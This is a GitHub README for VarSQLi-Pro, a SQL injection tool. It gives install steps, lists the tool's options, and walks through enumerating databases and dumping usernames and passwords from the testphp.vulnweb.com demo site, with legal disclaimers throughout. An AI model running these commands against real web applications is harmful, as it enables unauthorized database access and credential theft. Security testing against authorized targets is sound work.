- [![.github/workflows/tests.yml](https://github.com/sqlmapproject/sqlmap/actions/workflows/tests.yml/badge.svg)](https://github.com/sqlmapproject/sqlmap/actions/workflows/tests.yml)
- [![Python|3.x](https://img.shields.io/badge/python-3.x-yellow.svg)](https://www.python.org/)
- [![License](https://img.shields.io/badge/license-GPLv1-red.svg)](https://raw.githubusercontent.com/sqlmapproject/sqlmap/master/LICENSE)
- [![Twitter](https://img.shields.io/badge/twitter-@Anonym0us_VNPC-blue.svg)](https://twitter.com/Anonym0us_VNPC)


# Variable SQL Injection Pro
VarSQLi-Pro or Variable SQL Injection Pro - is an upgraded version of VarSQL, a tool designed to detect and exploit SQL Injection vulnerabilities in web applications. SQL Injection is a common security vulnerability in web applications that allows attackers to perform malicious actions and gain unauthorized access to databases.

> VarSQLi-Pro is designed to assist security professionals and those interested in web application security testing in identifying and exploiting SQL Injection vulnerabilities. The tool automatically scans and searches for weaknesses in web applications, and provides users with options to execute SQL Injection attacks and test the security of the system.
### Screenshot
<img src="https://raw.githubusercontent.com/Phamchie/varsqli-pro/main/Img/Screenshot_2023-08-04-15-49-15-17.jpg">

However, it is important to use this tool responsibly and within legal boundaries. Unauthorized access to databases or conducting attacks without proper authorization is illegal and unethical. The use of this tool should only be for educational, research, and improving the security of web applications.

> When using VarSQLi-Pro or any other security testing tool, always adhere to rules and regulations. Protecting personal information and ensuring security is our responsibility and should be ensured in all online activities.

>> Always strive to learn and understand security concepts to effectively protect web applications and databases.

## Setup And install 
- Step 1: Open a terminal or command prompt on your computer.

- Step 2: Navigate to the folder where you want to store the VarSQLi-Pro source code.

- Step 3: Run the following command to clone the source code from the Git repository:
`git clone https://github.com/Phamchie/varsqli-pro`

- Step 4: After the copying is complete, move to the newly created VarSQLi-Pro folder:
`cd VarSQLi-Pro`

- Step 5: Install the dependent libraries by running the following command:
`pip install -r requirements.txt`

- Step 6: After successful installation, you can run VarSQLi-Pro with the command:
`python3 varsqli.py`
```
git clone https://github.com/Phamchie/varsqli-pro
cd varsqli-pro
pyton3 setup.py
python3 varsqli.py --help
```
- Note: Make sure that you have the right to access and use this tool for its lawful purposes. Using this tool unethically or in violation of the law can have serious consequences. Please always follow the cybersecurity rules and regulations and use this tool responsibly
### How To Used ?
- To use this tool first, I will introduce the tool modes
```
options:
  -h, --help         show this help message and exit
  -u URL, --url URL  URL Target ( e.g : https://test.com?path_vuln.php?id=1)
  --dbs              Enumerate DBMS databases
  --tables           Enumerate DBMS database tables
  --columns          Enumerate DBMS database table columns
  -D DB              DBMS database to enumerate
  --dump-all         Dump All DBMS database table columns
  -T TB              Enumerate database to enumerate tables ( ex : --dump-all -T < tables name > -C < columns name >)
  -C CO              Enumerate database to enumerate columns ( ex : --dump-all -T < tables name > -C < columns name >)
```
 - after thoroughly learning about the modes, to exploit SQL Injection on a certain SQL database error website, you use this command to extract the database name

```
$ python3 varsqli.py -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs
```
<img src="https://raw.githubusercontent.com/Phamchie/varsqli-pro/main/Img/Screenshot_2023-08-04-16-10-49-93.jpg">
<img src="https://raw.githubusercontent.com/Phamchie/varsqli-pro/main/Img/Screenshot_2023-08-04-16-14-14-40.jpg">

- After we have extracted and obtained the name of the database, you use options `--tables -D <database name>` , this is the command, extract all databases  In the tables section, the command:

```
$ python3 varsqli.py -u http://testphp.vulnweb.com/listproducts.php?cat=1 --tables -D acuart
```
<img src="https://raw.githubusercontent.com/Phamchie/varsqli-pro/main/Img/Screenshot_2023-08-04-16-29-35-14.jpg">

- well , you can see , too got the database name in Tables , okay , next , you guys and I get the database name in columns , we use options as `-  -columns -D <database name>` , and here is the command below
```
$ python3 varsqli.py -u http://testphp.vulnweb.com/listproducts.php?cat=1 --columns -D acuart
```
<img src="https://raw.githubusercontent.com/Phamchie/varsqli-pro/main/Img/Screenshot_2023-08-04-17-00-16-21.jpg">

- after i see it says find the number of columns entries of the whole database , so tables Users have some columns like : `id` , `cart` , `pass` , `uname` , now I will dump it , to dump the database  , we use options `-D <database name> --dump-all -T <tables item name> -C <column item name>`, command:
```
python3 varsqli.py -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --dump-all -T users -C pass,uname
```
- this command I will dump the `password` and `uname` to get the username and password
- here is the result, password and user are test and test
<img src="https://raw.githubusercontent.com/Phamchie/varsqli-pro/main/Img/Screenshot_2023-08-04-17-07-59-22.jpg">

### ending
- Remember, using VarSQLi-Pro or any similar tool for illegal activities can result in severe legal consequences, including imprisonment. It is crucial to prioritize ethical hacking practices, collaborate with security professionals, and comply with relevant laws and regulations to ensure responsible and lawful use of such tools.
